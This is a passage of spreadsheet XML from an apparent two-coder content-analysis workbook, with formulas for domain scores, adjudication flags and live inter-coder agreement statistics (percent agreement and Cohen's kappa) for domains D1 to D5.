        <f>IF(AI224="","",N(E224)*3+N(F224)*2+N(G224)*2+N(H224)*2+N(I224)*2+N(J224)*3+N(K224)*3+N(L224)*3)</f>
        <v/>
      </c>
      <c r="AK224" s="11">
        <f>IF(AI224="","",COUNTIF(N224:AG224,1))</f>
        <v/>
      </c>
      <c r="AL224" s="11">
        <f>IF(OR(AJ224="",AJ224=0),"",ROUND(100*(AJ224-AK224)/AJ224,1))</f>
        <v/>
      </c>
      <c r="AM224" s="11">
        <f>IF(AND(Coder1!AN224=1,Coder2!AN224=1),IF(COUNTBLANK(E224:AH224)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN224" s="11">
        <f>IF(AND(Coder1!AN224=1,Coder2!AN224=1),IF(SUMPRODUCT(--(Coder1!E224:AH224&amp;""&lt;&gt;Coder2!E224:AH224&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO224" s="11" t="n"/>
    </row>
  </sheetData>
  <conditionalFormatting sqref="E2:AH224">
    <cfRule type="expression" priority="1" dxfId="1">
      <formula>AND($AM2="Adjudicate blank cells",LEN(E2)=0)</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24" customWidth="1" min="8" max="8"/>
  </cols>
  <sheetData>
    <row r="1">
      <c r="A1" s="3" t="inlineStr">
        <is>
          <t>Live inter-coder agreement (binary domains). κ uses rows where both coders marked the row done.</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" s="4" t="inlineStr">
        <is>
          <t>Item</t>
        </is>
      </c>
      <c r="B2" s="4" t="inlineStr">
        <is>
          <t>Rows (pilot)</t>
        </is>
      </c>
      <c r="C2" s="4" t="inlineStr">
        <is>
          <t>p_o (pilot)</t>
        </is>
      </c>
      <c r="D2" s="4" t="inlineStr">
        <is>
          <t>κ (pilot)</t>
        </is>
      </c>
      <c r="E2" s="4" t="inlineStr">
        <is>
          <t>Rows (all)</t>
        </is>
      </c>
      <c r="F2" s="4" t="inlineStr">
        <is>
          <t>p_o (all)</t>
        </is>
      </c>
      <c r="G2" s="4" t="inlineStr">
        <is>
          <t>κ (all)</t>
        </is>
      </c>
      <c r="H2" s="4" t="inlineStr">
        <is>
          <t>Flag</t>
        </is>
      </c>
    </row>
    <row r="3">
      <c r="A3" s="2" t="inlineStr">
        <is>
          <t>D1</t>
        </is>
      </c>
      <c r="B3" s="2">
        <f>SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="C3" s="15">
        <f>IF(B3=0,"",SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=Coder2!$E$2:$E$224))/B3)</f>
        <v/>
      </c>
      <c r="D3" s="15">
        <f>IF(B3=0,"",IF(((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=1))/B3)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$E$2:$E$224=1))/B3)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=1))/B3))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$E$2:$E$224=1))/B3)))=1,1,(C3-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=1))/B3)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$E$2:$E$224=1))/B3)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=1))/B3))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$E$2:$E$224=1))/B3))))/(1-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=1))/B3)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$E$2:$E$224=1))/B3)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=1))/B3))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$E$2:$E$224=1))/B3))))))</f>
        <v/>
      </c>
      <c r="E3" s="2">
        <f>SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F3" s="15">
        <f>IF(E3=0,"",SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=Coder2!$E$2:$E$224))/E3)</f>
        <v/>
      </c>
      <c r="G3" s="15">
        <f>IF(E3=0,"",IF(((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=1))/E3)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$E$2:$E$224=1))/E3)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=1))/E3))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$E$2:$E$224=1))/E3)))=1,1,(F3-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=1))/E3)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$E$2:$E$224=1))/E3)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=1))/E3))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$E$2:$E$224=1))/E3))))/(1-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=1))/E3)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$E$2:$E$224=1))/E3)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$E$2:$E$224=1))/E3))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$E$2:$E$224=1))/E3))))))</f>
        <v/>
      </c>
      <c r="H3" s="2">
        <f>IF(D3="","",IF(D3&lt;0.6,"Revise wording (κ &lt; .60)","OK"))</f>
        <v/>
      </c>
    </row>
    <row r="4">
      <c r="A4" s="2" t="inlineStr">
        <is>
          <t>D2</t>
        </is>
      </c>
      <c r="B4" s="2">
        <f>SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="C4" s="15">
        <f>IF(B4=0,"",SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=Coder2!$F$2:$F$224))/B4)</f>
        <v/>
      </c>
      <c r="D4" s="15">
        <f>IF(B4=0,"",IF(((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=1))/B4)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$F$2:$F$224=1))/B4)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=1))/B4))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$F$2:$F$224=1))/B4)))=1,1,(C4-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=1))/B4)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$F$2:$F$224=1))/B4)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=1))/B4))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$F$2:$F$224=1))/B4))))/(1-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=1))/B4)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$F$2:$F$224=1))/B4)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=1))/B4))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$F$2:$F$224=1))/B4))))))</f>
        <v/>
      </c>
      <c r="E4" s="2">
        <f>SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F4" s="15">
        <f>IF(E4=0,"",SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=Coder2!$F$2:$F$224))/E4)</f>
        <v/>
      </c>
      <c r="G4" s="15">
        <f>IF(E4=0,"",IF(((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=1))/E4)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$F$2:$F$224=1))/E4)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=1))/E4))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$F$2:$F$224=1))/E4)))=1,1,(F4-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=1))/E4)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$F$2:$F$224=1))/E4)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=1))/E4))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$F$2:$F$224=1))/E4))))/(1-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=1))/E4)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$F$2:$F$224=1))/E4)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$F$2:$F$224=1))/E4))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$F$2:$F$224=1))/E4))))))</f>
        <v/>
      </c>
      <c r="H4" s="2">
        <f>IF(D4="","",IF(D4&lt;0.6,"Revise wording (κ &lt; .60)","OK"))</f>
        <v/>
      </c>
    </row>
    <row r="5">
      <c r="A5" s="2" t="inlineStr">
        <is>
          <t>D3</t>
        </is>
      </c>
      <c r="B5" s="2">
        <f>SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="C5" s="15">
        <f>IF(B5=0,"",SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=Coder2!$G$2:$G$224))/B5)</f>
        <v/>
      </c>
      <c r="D5" s="15">
        <f>IF(B5=0,"",IF(((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=1))/B5)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$G$2:$G$224=1))/B5)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=1))/B5))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$G$2:$G$224=1))/B5)))=1,1,(C5-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=1))/B5)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$G$2:$G$224=1))/B5)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=1))/B5))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$G$2:$G$224=1))/B5))))/(1-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=1))/B5)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$G$2:$G$224=1))/B5)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=1))/B5))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$G$2:$G$224=1))/B5))))))</f>
        <v/>
      </c>
      <c r="E5" s="2">
        <f>SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F5" s="15">
        <f>IF(E5=0,"",SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=Coder2!$G$2:$G$224))/E5)</f>
        <v/>
      </c>
      <c r="G5" s="15">
        <f>IF(E5=0,"",IF(((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=1))/E5)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$G$2:$G$224=1))/E5)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=1))/E5))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$G$2:$G$224=1))/E5)))=1,1,(F5-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=1))/E5)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$G$2:$G$224=1))/E5)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=1))/E5))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$G$2:$G$224=1))/E5))))/(1-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=1))/E5)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$G$2:$G$224=1))/E5)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$G$2:$G$224=1))/E5))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$G$2:$G$224=1))/E5))))))</f>
        <v/>
      </c>
      <c r="H5" s="2">
        <f>IF(D5="","",IF(D5&lt;0.6,"Revise wording (κ &lt; .60)","OK"))</f>
        <v/>
      </c>
    </row>
    <row r="6">
      <c r="A6" s="2" t="inlineStr">
        <is>
          <t>D4</t>
        </is>
      </c>
      <c r="B6" s="2">
        <f>SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="C6" s="15">
        <f>IF(B6=0,"",SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=Coder2!$H$2:$H$224))/B6)</f>
        <v/>
      </c>
      <c r="D6" s="15">
        <f>IF(B6=0,"",IF(((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=1))/B6)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$H$2:$H$224=1))/B6)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=1))/B6))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$H$2:$H$224=1))/B6)))=1,1,(C6-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=1))/B6)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$H$2:$H$224=1))/B6)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=1))/B6))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$H$2:$H$224=1))/B6))))/(1-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=1))/B6)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$H$2:$H$224=1))/B6)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=1))/B6))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$H$2:$H$224=1))/B6))))))</f>
        <v/>
      </c>
      <c r="E6" s="2">
        <f>SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F6" s="15">
        <f>IF(E6=0,"",SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=Coder2!$H$2:$H$224))/E6)</f>
        <v/>
      </c>
      <c r="G6" s="15">
        <f>IF(E6=0,"",IF(((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=1))/E6)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$H$2:$H$224=1))/E6)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=1))/E6))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$H$2:$H$224=1))/E6)))=1,1,(F6-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=1))/E6)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$H$2:$H$224=1))/E6)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=1))/E6))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$H$2:$H$224=1))/E6))))/(1-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=1))/E6)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$H$2:$H$224=1))/E6)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$H$2:$H$224=1))/E6))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$H$2:$H$224=1))/E6))))))</f>
        <v/>
      </c>
      <c r="H6" s="2">
        <f>IF(D6="","",IF(D6&lt;0.6,"Revise wording (κ &lt; .60)","OK"))</f>
        <v/>
      </c>
    </row>
    <row r="7">
      <c r="A7" s="2" t="inlineStr">
        <is>
          <t>D5</t>
        </is>
      </c>
      <c r="B7" s="2">
        <f>SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="C7" s="15">
        <f>IF(B7=0,"",SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=Coder2!$I$2:$I$224))/B7)</f>
        <v/>
      </c>
      <c r="D7" s="15">
        <f>IF(B7=0,"",IF(((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=1))/B7)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$I$2:$I$224=1))/B7)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=1))/B7))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$I$2:$I$224=1))/B7)))=1,1,(C7-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=1))/B7)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$I$2:$I$224=1))/B7)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=1))/B7))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$I$2:$I$224=1))/B7))))/(1-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=1))/B7)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$I$2:$I$224=1))/B7)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=1))/B7))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$I$2:$I$224=1))/B7))))))</f>
        <v/>
      </c>
      <c r="E7" s="2">
        <f>SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F7" s="15">
        <f>IF(E7=0,"",SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=Coder2!$I$2:$I$224))/E7)</f>
        <v/>
      </c>
      <c r="G7" s="15">
        <f>IF(E7=0,"",IF(((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=1))/E7)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$I$2:$I$224=1))/E7)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=1))/E7))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$I$2:$I$224=1))/E7)))=1,1,(F7-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=1))/E7)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$I$2:$I$224=1))/E7)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=1))/E7))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$I$2:$I$224=1))/E7))))/(1-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=1))/E7)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$I$2:$I$224=1